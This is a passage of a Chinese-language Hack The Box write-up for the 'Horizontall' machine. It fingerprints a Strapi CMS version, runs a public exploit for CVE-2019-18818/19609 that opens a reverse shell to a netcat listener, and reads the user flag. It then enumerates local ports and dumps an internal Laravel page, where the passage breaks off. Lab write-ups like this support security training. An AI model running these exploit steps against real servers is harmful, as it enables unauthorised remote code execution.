<br>[22:18:17] 403 -   60B  - /users/<br><br>Task Completed<br></code></pre></td></tr></table></figure>

<p>11、发现了一个登录页面，strapi 的一个框架网站</p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
<p>12、通过检索，在以下一个参考文章中发现了涉及具体版本信息的路径地址，并获取到了当前这个网站的版本号信息</p>
<p><code>https://thatsn0tmysite.wordpress.com/2019/11/15/x05/</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ curl http://api-prod.horizontall.htb/admin/strapiVersion   <br>&#123;<span class="hljs-string">&quot;strapiVersion&quot;</span>:<span class="hljs-string">&quot;3.0.0-beta.17.4&quot;</span>&#125;<br></code></pre></td></tr></table></figure>

<p>13、通过谷歌检索， 发现了一个结合型的漏洞利用工具</p>
<p><img src="http://sh1yan.top/photo/Horizontall-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/glowbase/CVE-2019-19609/blob/main/exploit.py<br><br>此漏洞利用的目标是 Strapi CMS Framework 版本3.0.0-beta-17.4中的两个漏洞，允许未经身份验证的远程代码执行 (RCE)。<br><br>CVE-2019-18818<br>忘记密码的弱密码恢复机制<br><br>CVSS：9.8 - 严重<br><br>更多详细信息：https://nvd.nist.gov/vuln/detail/CVE-2019-18818<br><br>CVE-2019-19609<br>操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）<br><br>CVSS：7.2 - 高<br><br>更多详细信息：https://nvd.nist.gov/vuln/detail/CVE-2019-19609<br></code></pre></td></tr></table></figure>

<p>14、然后我们下载开漏洞利用工具进行漏洞利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> exploit.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 exploit.py http://api-prod.horizontall.htb 10.10.14.2 443<br>========================================================<br>|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |<br>========================================================<br>[+] Checking Strapi CMS version<br>[+] Looks like this exploit should work!<br>[+] Executing exploit<br></code></pre></td></tr></table></figure>

<p>15、这边成功收到监听的结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.2] from (UNKNOWN) [10.10.11.105] 49878<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)</span><br></code></pre></td></tr></table></figure>

<p>16、根据查看这个获取的用户的名称，我们直接获取到了第一个flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /home/<br>total 12<br>drwxr-xr-x  3 root      root      4096 May 25  2021 .<br>drwxr-xr-x 24 root      root      4096 Aug 23  2021 ..<br>drwxr-xr-x  8 developer developer 4096 Aug  2  2021 developer<br>$ <span class="hljs-built_in">ls</span> -la /home/developer<br>total 108<br>drwxr-xr-x  8 developer developer  4096 Aug  2  2021 .<br>drwxr-xr-x  3 root      root       4096 May 25  2021 ..<br>lrwxrwxrwx  1 root      root          9 Aug  2  2021 .bash_history -&gt; /dev/null<br>-rw-r-----  1 developer developer   242 Jun  1  2021 .bash_logout<br>-rw-r-----  1 developer developer  3810 Jun  1  2021 .bashrc<br>drwx------  3 developer developer  4096 May 26  2021 .cache<br>-rw-rw----  1 developer developer 58460 May 26  2021 composer-setup.php<br>drwx------  5 developer developer  4096 Jun  1  2021 .config<br>drwx------  3 developer developer  4096 May 25  2021 .gnupg<br>drwxrwx---  3 developer developer  4096 May 25  2021 .<span class="hljs-built_in">local</span><br>drwx------ 12 developer developer  4096 May 26  2021 myproject<br>-rw-r-----  1 developer developer   807 Apr  4  2018 .profile<br>drwxrwx---  2 developer developer  4096 Jun  4  2021 .ssh<br>-r--r--r--  1 developer developer    33 Dec 26 13:36 user.txt<br>lrwxrwxrwx  1 root      root          9 Aug  2  2021 .viminfo -&gt; /dev/null<br>$ <span class="hljs-built_in">cat</span> /home/developer/user.txt<br>2eebcc56232c8e60a8645d8b83b3ebd3<br>$ <br></code></pre></td></tr></table></figure>


<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>17、通过信息枚举，查看srtapi的目录，发现并没有什么有用的信息获取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">pwd</span><br>/opt/strapi/myapi<br>$ <span class="hljs-built_in">ls</span> -la<br>total 648<br>drwxr-xr-x    9 strapi strapi   4096 Jul 29  2021 .<br>drwxr-xr-x    9 strapi strapi   4096 Aug  2  2021 ..<br>drwxr-xr-x    3 strapi strapi   4096 May 29  2021 api<br>drwxrwxr-x    2 strapi strapi  12288 May 26  2021 build<br>drwxrwxr-x    5 strapi strapi   4096 May 26  2021 .cache<br>drwxr-xr-x    5 strapi strapi   4096 Jul 29  2021 config<br>-rw-r--r--    1 strapi strapi    249 May 26  2021 .editorconfig<br>-rw-r--r--    1 strapi strapi     32 May 26  2021 .eslintignore<br>-rw-r--r--    1 strapi strapi    541 May 26  2021 .eslintrc<br>drwxr-xr-x    3 strapi strapi   4096 May 26  2021 extensions<br>-rw-r--r--    1 strapi strapi   1150 May 26  2021 favicon.ico<br>-rw-r--r--    1 strapi strapi   1119 May 26  2021 .gitignore<br>drwxrwxr-x 1099 strapi strapi  36864 Aug  3  2021 node_modules<br>-rw-rw-r--    1 strapi strapi   1009 May 26  2021 package.json<br>-rw-rw-r--    1 strapi strapi 552845 May 26  2021 package-lock.json<br>drwxr-xr-x    3 strapi strapi   4096 Jun  2  2021 public<br>-rw-r--r--    1 strapi strapi     69 May 26  2021 README.md<br>$ python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>strapi@horizontall:~/myapi$ <br></code></pre></td></tr></table></figure>

<p>18、但是通过查看开放端口情况，发现了一个 8000 的端口信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~/myapi$ ss -tl<br>ss -tl<br>State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    <br>LISTEN   0         128                 0.0.0.0:http             0.0.0.0:*       <br>LISTEN   0         128                 0.0.0.0:ssh              0.0.0.0:*       <br>LISTEN   0         128               127.0.0.1:1337             0.0.0.0:*       <br>LISTEN   0         128               127.0.0.1:8000             0.0.0.0:*       <br>LISTEN   0         80                127.0.0.1:mysql            0.0.0.0:*       <br>LISTEN   0         128                    [::]:http                [::]:*       <br>LISTEN   0         128                    [::]:ssh                 [::]:*     <br></code></pre></td></tr></table></figure>

<p>19、使用 curl 查看这个网站的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~/myapi$ curl 127.0.0.1:8000<br>curl 127.0.0.1:8000<br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">head</span>&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br><br>        &lt;title&gt;Laravel&lt;/title&gt;<br><br>        &lt;!-- Fonts --&gt;<br>        &lt;<span class="hljs-built_in">link</span> href=<span class="hljs-string">&quot;https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&amp;display=swap&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br><br>        &lt;!-- Styles --&gt;<br>        &lt;style&gt;<br>            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html&#123;line-height:1.15;-webkit-text-size-adjust:100%&#125;body&#123;margin:0&#125;a&#123;background-color:transparent&#125;[hidden]&#123;display:none&#125;html&#123;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5&#125;*,:after,:before&#123;box-sizing:border-box;border:0 solid <span class="hljs-comment">#e2e8f0&#125;a&#123;color:inherit;text-decoration:inherit&#125;svg,video&#123;display:block;vertical-align:middle&#125;video&#123;max-width:100%;height:auto&#125;.bg-white&#123;--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))&#125;.bg-gray-100&#123;--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))&#125;.border-gray-200&#123;--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))&#125;.border-t&#123;border-top-width:1px&#125;.flex&#123;display:flex&#125;.grid&#123;display:grid&#125;.hidden&#123;display:none&#125;.items-center&#123;align-items:center&#125;.justify-center&#123;justify-content:center&#125;.font-semibold&#123;font-weight:600&#125;.h-5&#123;height:1.25rem&#125;.h-8&#123;height:2rem&#125;.h-16&#123;height:4rem&#125;.text-sm&#123;font-size:.875rem&#125;.text-lg&#123;font-size:1.125rem&#125;.leading-7&#123;line-height:1.75rem&#125;.mx-auto&#123;margin-left:auto;margin-right:auto&#125;.ml-1&#123;margin-left:.25rem&#125;.mt-2&#123;margin-top:.5rem&#125;.mr-2&#123;margin-right:.5rem&#125;.ml-2&#123;margin-left:.5rem&#125;.mt-4&#123;margin-top:1rem&#125;.ml-4&#123;margin-left:1rem&#125;.mt-8&#123;margin-top:2rem&#125;.ml-12&#123;margin-left:3rem&#125;.-mt-px&#123;margin-top:-1px&#125;.max-w-6xl&#123;max-width:72rem&#125;.min-h-screen&#123;min-height:100vh&#125;.overflow-hidden&#123;overflow:hidden&#125;.p-6&#123;padding:1.5rem&#125;.py-4&#123;padding-top:1rem;padding-bottom:1rem&#125;.px-6&#123;padding-left:1.5rem;padding-right:1.5rem&#125;.pt-8&#123;padding-top:2rem&#125;.fixed&#123;position:fixed&#125;.relative&#123;position:relative&#125;.top-0&#123;top:0&#125;.right-0&#123;right:0&#125;.shadow&#123;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)&#125;.text-center&#123;text-align:center&#125;.text-gray-200&#123;--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))&#125;.text-gray-300&#123;--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))&#125;.text-gray-400&#123;--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))&#125;.text-gray-500&#123;--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))&#125;.text-gray-600&#123;--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))&#125;.text-gray-700&#123;--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))&#125;.text-gray-900&#123;--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))&#125;.underline&#123;text-decoration:underline&#125;.antialiased&#123;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale&#125;.w-5&#123;width:1.25rem&#125;.w-8&#123;width:2rem&#125;.w-auto&#123;width:auto&#125;.grid-cols-1&#123;grid-template-columns:repeat(1,minmax(0,1fr))&#125;@media (min-width:640px)&#123;.sm\:rounded-lg&#123;border-radius:.5rem&#125;.sm\:block&#123;display:block&#125;.sm\:items-center&#123;align-items:center&#125;.sm\:justify-start&#123;justify-content:flex-start&#125;.sm\:justify-between&#123;justify-content:space-between&#125;.sm\:h-20&#123;height:5rem&#125;.sm\:ml-0&#123;margin-left:0&#125;.sm\:px-6&#123;padding-left:1.5rem;padding-right:1.5rem&#125;.sm\:pt-0&#123;padding-top:0&#125;.sm\:text-left&#123;text-align:left&#125;.sm\:text-right&#123;text-align:right&#125;&#125;@media (min-width:768px)&#123;.md\:border-t-0&#123;border-top-width:0&#125;.md\:border-l&#123;border-left-width:1px&#125;.md\:grid-cols-2&#123;grid-template-columns:repeat(2,minmax(0,1fr))&#125;&#125;@media (min-width:1024px)&#123;.lg\:px-8&#123;padding-left:2rem;padding-right:2rem&#125;&#125;@media (prefers-color-scheme:dark)&#123;.dark\:bg-gray-800&#123;--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))&#125;.dark\:bg-gray-900&#123;--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))&#125;.dark\:border-gray-700&#123;--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))&#125;.dark\:text-white&#123;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))&#125;.dark\:text-gray-400&#123;--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))&#125;&#125;</span><br>        &lt;/style&gt;<br><br>        &lt;style&gt;<br>            body &#123;<br>                font-family: <span class="hljs-string">&#x27;Nunito&#x27;</span>;<br>            &#125;<br>        &lt;/style&gt;<br>    &lt;/head&gt;<br>    &lt;body class=<span class="hljs-string">&quot;antialiased&quot;</span>&gt;<br>        &lt;div class=<span class="hljs-string">&quot;relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0&quot;</span>&gt;<br>            <br>            &lt;div class=<span class="hljs-string">&quot;max-w-6xl mx-auto sm:px-6 lg:px-8&quot;</span>&gt;<br>                &lt;div class=<span class="hljs-string">&quot;flex justify-center pt-8 sm:justify-start sm:pt-0&quot;</span>&gt;<br>                    &lt;svg viewBox=<span class="hljs-string">&quot;0 0 651 192&quot;</span> fill=<span class="hljs-string">&quot;none&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> class=<span class="hljs-string">&quot;h-16 w-auto text-gray-700 sm:h-20&quot;</span>&gt;<br>                        &lt;g clip-path=<span class="hljs-string">&quot;url(#clip0)&quot;</span> fill=<span class="hljs-string">&quot;#EF3B2D&quot;</span>&gt;<br>                            &lt;path d=<span class="hljs-string">&quot;M248.032 44.676h-16.466v100.23h47.394v-14.748h-30.928V44.676zM337.091 87.202c-2.101-3.341-5.083-5.965-8.949-7.875-3.865-1.909-7.756-2.864-11.669-2.864-5.062 0-9.69.931-13.89 2.792-4.201 1.861-7.804 4.417-10.811 7.661-3.007 3.246-5.347 6.993-7.016 11.239-1.672 4.249-2.506 8.713-2.506 13.389 0 4.774.834 9.26 2.506 13.459 1.669 4.202 4.009 7.925 7.016 11.169 3.007 3.246 6.609 5.799 10.811 7.66 4.199 1.861 8.828 2.792 13.89 2.792 3.913 0 7.804-.955 11.669-2.863 3.866-1.908 6.849-4.533 8.949-7.875v9.021h15.607V78.182h-15.607v9.02zm-1.431 32.503c-.955 2.578-2.291 4.821-4.009 6.73-1.719 1.91-3.795 3.437-6.229 4.582-2.435 1.146-5.133 1.718-8.091 1.718-2.96 0-5.633-.572-8.019-1.718-2.387-1.146-4.438-2.672-6.156-4.582-1.719-1.909-3.032-4.152-3.938-6.73-.909-2.577-1.36-5.298-1.36-8.161 0-2.864.451-5.585 1.36-8.162.905-2.577 2.219-4.819 3.938-6.729 1.718-1.908 3.77-3.437 6.156-4.582 2.386-1.146 5.059-1.718 8.019-1.718 2.958 0 5.656.572 8.091 1.718 2.434 1.146 4.51 2.674 6.229 4.582 1.718 1.91 3.054 4.152 4.009 6.729.953 2.577 1.432 5.298 1.432 8.162-.001 2.863-.479 5.584-1.432 8.161zM463.954 87.202c-2.101-3.341-5.083-5.965-8.949-7.875-3.865-1.909-7.756-2.864-11.669-2.864-5.062 0-9.69.931-13.89 2.792-4.201 1.861-7.804 4.417-10.811 7.661-3.007 3.246-5.347 6.993-7.016 11.239-1.672 4.249-2.506 8.713-2.506 13.389 0 4.774.834 9.26 2.506 13.459 1.669 4.202 4.009 7.925 7.016 11.169 3.007 3.246 6.609 5.799 10.811 7.66 4.199 1.861 8.828 2.792 13.89 2.792 3.913 0 7.804-.955 11.669-2.863 3.866-1.908 6.849-4.533 8.949-7.875v9.021h15.607V78.182h-15.607v9.02zm-1.432 32.503c-.955 2.578-2.291 4.821-4.009 6.73-1.719 1.91-3.795 3.437-6.229 4.582-2.435 1.146-5.133 1.718-8.091 1.718-2.96 0-5.633-.572-8.019-1.718-2.387-1.146-4.438-2.672-6.156-4.582-1.719-1.909-3.032-4.152-3.938-6.73-.909-2.577-1.36-5.298-1.36-8.161 0-2.864.451-5.585 1.36-8.162.905-2.577 2.219-4.819 3.938-6.729 1.718-1.908 3.77-3.437 6.156-4.582 2.386-1.146 5.059-1.718 8.019-1.718 2.958 0 5.656.572 8.091 1.718 2.434 1.146 4.51 2.674 6.229 4.582 1.718 1.91 3.054 4.152 4.009 6.729.953 2.577 1.432 5.298 1.432 8.162 0 2.863-.479 5.584-1.432 8.161zM650.772 44.676h-15.606v100.23h15.606V44.676zM365.013 144.906h15.607V93.538h26.776V78.182h-42.383v66.724zM542.133 78.182l-19.616 51.096-19.616-51.096h-15.808l25.617 66.724h19.614l25.617-66.724h-15.808zM591.98 76.466c-19.112 0-34.239 15.706-34.239 35.079 0 21.416 14.641 35.079 36.239 35.079 12.088 0 19.806-4.622 29.234-14.688l-10.544-8.158c-.006.008-7.958 10.449-19.832 10.449-13.802 0-19.612-11.127-19.612-16.884h51.777c2.72-22.043-11.772-40.877-33.023-40.877zm-18.713 29.28c.12-1.284 1.917-16.884 18.589-16.884 16.671 0 18.697 15.598 18.813 16.884h-37.402zM184.068 43.892c-.024-.088-.073-.165-.104-.25-.058-.157-.108-.316-.191-.46-.056-.097-.137-.176-.203-.265-.087-.117-.161-.242-.265-.345-.085-.086-.194-.148-.29-.223-.109-.085-.206-.182-.327-.252l-.002-.001-.002-.002-35.648-20.524a2.971 2.971 0 00-2.964 0l-35.647 20.522-.002.002-.002.001c-.121.07-.219.167-.327.252-.096.075-.205.138-.29.223-.103.103-.178.228-.265.345-.066.089-.147.169-.203.265-.083.144-.133.304-.191.46-.031.085-.08.162-.104.25-.067.249-.103.51-.103.776v38.979l-29.706 17.103V24.493a3 3 0 00-.103-.776c-.024-.088-.073-.165-.104-.25-.058-.157-.108-.316-.191-.46-.056-.097-.137-.176-.203-.265-.087-.117-.161-.242-.265-.345-.085-.086-.194-.148-.29-.223-.109-.085-.206-.182-.327-.252l-.002-.001-.002-.002L40.098 1.396a2.971 2.971 0 00-2.964 0L1.487 21.919l-.002.002-.002.001c-.121.07-.219.167-.327.252-.096.075-.205.138-.29.223-.103.103-.178.228-.265.345-.066.089-.147.169-.203.265-.083.144-.133.304-.191.46-.031.085-.08.162-.104.25-.067.249-.103.51-.103.776v122.09c0 1.063.568 2.044 1.489 2.575l71.293 41.045c.156.089.324.143.49.202.078.028.15.074.23.095a2.98 2.98 0 001.524 0c.069-.018.132-.059.2-.083.176-.061.354-.119.519-.214l71.293-41.045a2.971 2.971 0 001.489-2.575v-38.979l34.158-19.666a2.971 2.971 0 001.489-2.575V44.666a3.075 3.075 0 00-.106-.774zM74.255 143.167l-29.648-16.779 31.136-17.926.001-.001 34.164-19.669 29.674 17.084-21.772 12.428-43.555 24.863zm68.329-76.259v33.841l-12.475-7.182-17.231-9.92V49.806l12.475 7.182 17.231 9.92zm2.97-39.335l29.693 17.095-29.693 17.095-29.693-17.095 29.693-17.095zM54.06 114.089l-12.475 7.182V46.733l17.231-9.92 12.475-7.182v74.537l-17.231 9.921zM38.614 7.398l29.693 17.095-29.693 17.095L8.921 24.493 38.614 7.398zM5.938 29.632l12.475 7.182 17.231 9.92v79.676l.001.005-.001.006c0 .114.032.221.045.333.017.146.021.294.059.434l.002.007c.032.117.094.222.14.334.051.124.088.255.156.371a.036.036 0 00.004.009c.061.105.149.191.222.288.081.105.149.22.244.314l.008.01c.084.083.19.142.284.215.106.083.202.178.32.247l.013.005.011.008 34.139 19.321v34.175L5.939 144.867V29.632h-.001zm136.646 115.235l-65.352 37.625V148.31l48.399-27.628 16.953-9.677v33.862zm35.646-61.22l-29.706 17.102V66.908l17.231-9.92 12.475-7.182v33.841z&quot;</span>/&gt;<br>                        &lt;/g&gt;<br>                    &lt;/svg&gt;<br>                &lt;/div&gt;<br><br>                &lt;div class=<span class="hljs-string">&quot;mt-8 bg-white dark:bg-gray-800 overflow-hidden shadow sm:rounded-lg&quot;</span>&gt;<br>                    &lt;div class=<span class="hljs-string">&quot;grid grid-cols-1 md:grid-cols-2&quot;</span>&gt;<br>                        &lt;div class=<span class="hljs-string">&quot;p-6&quot;</span>&gt;<br>                            &lt;div class=<span class="hljs-string">&quot;flex items-center&quot;</span>&gt;<br>                                &lt;svg fill=<span class="hljs-string">&quot;none&quot;</span> stroke=<span class="hljs-string">&quot;currentColor&quot;</span> stroke-linecap=<span class="hljs-string">&quot;round&quot;</span> stroke-linejoin=<span class="hljs-string">&quot;round&quot;</span> stroke-width=<span class="hljs-string">&quot;2&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 24 24&quot;</span> class=<span class="hljs-string">&quot;w-8 h-8 text-gray-500&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253&quot;</span>&gt;&lt;/path&gt;&lt;/svg&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;ml-4 text-lg leading-7 font-semibold&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;https://laravel.com/docs&quot;</span> class=<span class="hljs-string">&quot;underline text-gray-900 dark:text-white&quot;</span>&gt;Documentation&lt;/a&gt;&lt;/div&gt;<br>                            &lt;/div&gt;<br><br>                            &lt;div class=<span class="hljs-string">&quot;ml-12&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;mt-2 text-gray-600 dark:text-gray-400 text-sm&quot;</span>&gt;<br>                                    Laravel has wonderful, thorough documentation covering every aspect of the framework. Whether you are new to the framework or have previous experience with Laravel, we recommend reading all of the documentation from beginning to end.<br>                                &lt;/div&gt;<br>                            &lt;/div&gt;<br>                        &lt;/div&gt;<br><br>                        &lt;div class=<span class="hljs-string">&quot;p-6 border-t border-gray-200 dark:border-gray-700 md:border-t-0 md:border-l&quot;</span>&gt;<br>                            &lt;div class=<span class="hljs-string">&quot;flex items-center&quot;</span>&gt;<br>                                &lt;svg fill=<span class="hljs-string">&quot;none&quot;</span> stroke=<span class="hljs-string">&quot;currentColor&quot;</span> stroke-linecap=<span class="hljs-string">&quot;round&quot;</span> stroke-linejoin=<span class="hljs-string">&quot;round&quot;</span> stroke-width=<span class="hljs-string">&quot;2&quot;</span> viewBox=<span class="hljs-string">&quot;0 0 24 24&quot;</span> class=<span class="hljs-string">&quot;w-8 h-8 text-gray-500&quot;</span>&gt;&lt;path d=<span class="hljs-string">&quot;M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z&quot;</span>&gt;&lt;/path&gt;&lt;path d=<span class="hljs-string">&quot;M15 13a3 3 0 11-6 0 3 3 0 016 0z&quot;</span>&gt;&lt;/path&gt;&lt;/svg&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;ml-4 text-lg leading-7 font-semibold&quot;</span>&gt;&lt;a href=<span class="hljs-string">&quot;https://laracasts.com&quot;</span> class=<span class="hljs-string">&quot;underline text-gray-900 dark:text-white&quot;</span>&gt;Laracasts&lt;/a&gt;&lt;/div&gt;<br>                            &lt;/div&gt;<br><br>                            &lt;div class=<span class="hljs-string">&quot;ml-12&quot;</span>&gt;<br>                                &lt;div class=<span class="hljs-string">&quot;mt-2 text-gray-600 dark:text-gray-400 text-sm&quot;</span>&gt;<br>                                    Laracasts offers thousands of video tutorials on Laravel, PHP, and JavaScript development. Check them out, see <span class="hljs-keyword">for</span> yourself, and massively level up your development skills <span class="hljs-keyword">in</span> the process.<br>                                &lt;/div&gt;<br>                            &lt;/div&gt;<br>                        &lt;/div&gt;<br><br>               